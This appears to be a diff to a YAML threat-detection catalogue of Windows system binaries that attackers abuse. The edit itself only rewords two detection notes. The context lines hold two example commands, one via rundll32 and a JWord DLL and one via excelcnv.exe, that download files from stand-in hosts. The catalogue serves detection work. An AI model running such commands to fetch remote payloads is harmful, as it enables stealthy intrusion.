@@ -19,7 +19,7 @@ procedures:
         - rundll32 "c:\Program Files\JWord\Plugin2\jwddl.dll",ActionDownload jwd^|http://foobar.com/xyz^|c:\test\abc^|60000^|
     detection:
       ideas: >
-        - monitor rundll32.exe process creation with specific command-line arguments.
+        - monitor rundll32.exe process creation with specific command line arguments.
       telemetry:
         process_create:
           - Windows EID 4688
@@ -45,7 +45,7 @@ procedures:
         - C:\Program Files*\Microsoft Office\root\Office*\excelcnv.exe -oice http://10.0.0.44:8080/prices.xsl c:\hunting\lolbins\prices.xslx
     detection:
       ideas: >
-        - monitor Excelcnv.exe execution with specific command-line parameters.
+        - monitor Excelcnv.exe execution with specific command line parameters.
       telemetry:
         process_create:
           - Windows EID 4688
